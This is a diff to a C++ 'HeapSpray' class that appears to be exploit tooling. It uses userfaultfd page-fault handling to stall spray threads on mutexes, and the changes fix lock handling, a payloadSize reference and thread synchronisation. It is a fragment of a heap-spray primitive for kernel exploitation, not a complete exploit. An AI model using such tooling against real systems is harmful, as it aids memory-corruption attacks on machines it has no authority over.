@@ -41,6 +41,8 @@ HeapSpray::fault_handler_thread(void *arg)
     addr = ((struct spray_argv*)arg)->addr;
     id = ((struct spray_argv*)arg)->id;
     HeapSpray *obj = ((struct spray_argv*)arg)->obj;
+    //In case any changes in lock[id]
+    pthread_mutex_t *locl_lock = obj->lock[id];
 
 #ifdef DEBUG
     printf("id %d enter fault_handler_thread\n", id);
@@ -78,12 +80,12 @@ HeapSpray::fault_handler_thread(void *arg)
         }
 
 #ifdef DEBUG
-        printf("[+] hang->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
+        printf("[+] hang->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-obj->payloadSize, msg.arg.pagefault.address);
 #endif
         pthread_mutex_unlock(obj->order_lock);
-        pthread_mutex_lock(obj->lock[id]); 
+        pthread_mutex_lock(locl_lock); 
 #ifdef DEBUG
-        printf("[+] unlock->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
+        printf("[+] unlock->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-obj->payloadSize, msg.arg.pagefault.address);
 #endif
 
         /* Display info about the page-fault event */
@@ -233,6 +235,16 @@ void HeapSpray::fork_and_spray(int round, int objs_each_round, int shade, int ne
         arg->obj = this;
         pthread_create(&thr, NULL, spray, (void *) arg);
     }
+
+    //Wait for page fault before exiting
+#ifdef DEBUG
+    printf("fork_and_spray wait for page fault before exiting\n");
+#endif
+    pthread_mutex_lock(order_lock);
+    pthread_mutex_unlock(order_lock);
+#ifdef DEBUG
+    printf("fork_and_spray exit\n");
+#endif
 }
 
 void *HeapSpray::init_pages() {
